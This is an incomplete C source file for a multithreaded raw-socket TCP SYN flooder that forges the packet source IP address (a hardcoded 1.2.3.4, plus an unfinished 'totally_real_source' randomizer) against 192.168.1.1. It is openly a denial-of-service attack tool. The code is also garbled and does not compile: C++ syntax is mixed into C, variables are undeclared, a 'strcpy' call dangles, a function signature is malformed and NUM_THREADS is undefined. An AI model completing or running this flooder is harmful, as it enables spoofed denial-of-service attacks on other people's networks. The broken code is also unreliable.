#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> 
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>

// Pseudo header needed for TCP checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};

typedef struct totally_real_source{

    char ip_address[16];
    unsigned short port = rand() % 40000;

} realsource;

realsource gensource(){

    realsource spair;

    srand(time(NULL));

    int octet[4];

    for(int c : octet){

        octet[c] = rand() % 256;

    }

    
    snprintf(ip, sizeof(ip_address), "%d.%d.%d.%d", octet[0], octet[1], octet[2], octet[3]);

    strcpy
    return spair;

}

// Function for calculating TCP checksum
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;

    return (answer);
}

void *send_tcp_packet(unsigned short sport, unsigned short dport, short void *threadid) {

    long tid = (long)threadid;
    int sockfd;
    struct sockaddr_in dest_addr;
    char packet[4096];

    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_header psh;

    // Create a raw socket
    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Set the destination address
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(80 + tid); // Different port for each thread
    dest_addr.sin_addr.s_addr = inet_addr("192.168.1.1"); // Same destination IP

    // Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(54321 + tid); // Different ID for each packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // Set to 0 before calculating checksum
    iph->saddr = inet_addr("1.2.3.4"); // Source IP (modify as needed)
    iph->daddr = dest_addr.sin_addr.s_addr;

    // IP checksum
    iph->check = csum((unsigned short *)packet, iph->tot_len);

    // Fill in the TCP Header
    tcph->source = htons(12345 + tid); // Different source port for each thread
    tcph->dest = dest_addr.sin_port;
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5; // TCP header size
    tcph->fin = 0;
    tcph->syn = 1; // SYN flag
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0; // Set to 0 before calculating checksum
    tcph->urg_ptr = 0;

    // Now the TCP checksum
    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    memcpy(&packet[sizeof(struct iphdr) + sizeof(struct tcphdr)], &psh, sizeof(struct pseudo_header));

    tcph->check = csum((unsigned short *)(packet + sizeof(struct iphdr)), sizeof(struct tcphdr) + sizeof(struct pseudo_header));

    // Send the packet
    if (sendto(sockfd, packet, iph->tot_len, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        perror("Send failed");
        exit(EXIT_FAILURE);
    }

    printf("TCP SYN packet sent from thread %ld\n", tid);

    // Close the socket
    close(sockfd);

    pthread_exit(NULL);
}

void *spam(void *tid){

    send_tcp_packet()

}

int main() {



    pthread_t threads[NUM_THREADS];
    int rc; //return code
    long t; //thread

    for (t = 0; t < NUM_THREADS; t++) {

        printf("Creating thread %ld\n", t);

        rc = pthread_create(&threads[t], NULL, send_tcp_packet, (void *)t);

        if (rc) {

            printf("ERROR; return code from pthread_create() is %d\n", rc);
            exit(-1);

        }
    }

    // Wait for all threads to complete
    for (t = 0; t < NUM_THREADS; t++) {

        pthread_join(threads[t], NULL);

    }

    printf("All threads completed\n");

    return 0;

}
